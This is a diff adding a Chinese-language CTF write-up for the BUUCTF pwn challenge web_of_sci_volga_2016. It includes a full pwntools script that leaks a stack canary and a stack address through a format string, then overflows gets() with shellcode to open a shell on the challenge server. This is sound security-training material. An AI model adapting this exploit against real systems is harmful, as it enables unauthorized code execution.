@@ -39,6 +39,8 @@ ANSI_COLOR="1;31
 
 [生成可打印的shellcode](https://xz.aliyun.com/news/5275)
 
+[buuctf之pwn题(持续更新)](https://www.z1r0.top/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/)
+
 ## 安全保护检查
 
 设某道题附加可执行文件 ciscn 。
@@ -1362,3 +1364,67 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+#### 例题 3：web_of_sci_volga_2016
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#web_of_sci_volga_2016)
+
+查看保护：
+
+<img width="404" height="140" alt="319b8030d817d8012a1fc29ffacac555" src="https://github.com/user-attachments/assets/4b4805f7-efa6-4e50-800a-5add29acc7dd" />
+
+主要函数反编译：
+
+<img width="1280" height="512" alt="e186151663aa0fc7eed3dfd2dbe339f6" src="https://github.com/user-attachments/assets/436106cd-0ef2-4e6c-ab65-a33654572715" />
+
+发现，`printf(format);` 格式化字符串漏洞，可以泄露 Canary 和 栈地址，`gets(nptr)` 可以栈溢出。
+
+```
+char nptr[136]; // [rsp+A0h] [rbp-A0h] BYREF
+unsigned __int64 v8; // [rsp+128h] [rbp-18h]
+v8 = __readfsqword(0x28u);
+```
+
+基本可以确定 v8 是 Canary 的栈副本，0xA0 - 0X18 = 0x88 = 136，这就是覆盖到 canary 需要的 offset。
+
+然后查 Canary_k 和 stack_k：
+
+<img width="409" height="310" alt="image" src="https://github.com/user-attachments/assets/87488515-ac85-4825-8bdd-572e5cb20c1d" />
+
+可见 `Canary_k = 43`。
+
+<img width="404" height="98" alt="8de4a9b68281e79cd5acecd4a54b7683" src="https://github.com/user-attachments/assets/a4658e16-54f5-45b4-8bfb-9b5caedc72d8" />
+
+```
+# written by Sonnety
+from pwn import *
+context.arch = "amd64"
+
+host = "node5.buuoj.cn"
+port = "27101"
+offset = 136
+
+def main():
+    io = remote(host,port)
+    io.recvuntil(b"Tell me your name first\n")
+    io.sendline(b"%43$p.%46$p")  # canary_k = 43,stack_k = 46
+    io.recvuntil(b"Alright, pass a little test first, would you.\n")
+    io.recvline()
+    io.recvuntil("0x")
+    canary = int(io.recv(16),16)
+    io.recvuntil("0x")
+    stack_addr = int(io.recv(12),16)
+    for i in range(9):
+        io.sendline("Sonnety kawaii daisuki")
+        io.recv()
+    shellcode = asm(shellcraft.sh())
+    payload = shellcode + (offset - len(shellcode)) * b"A" + p64(canary) + 3 * p64(0x0) + p64(stack_addr - 192)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+可见 `stack_k = 46`（通过开头是栈地址 `0x7ffd…` 以及 16 字节对齐，结尾通常是 `...0`, `...10`, `...f0`, `...e0` 判断）
+
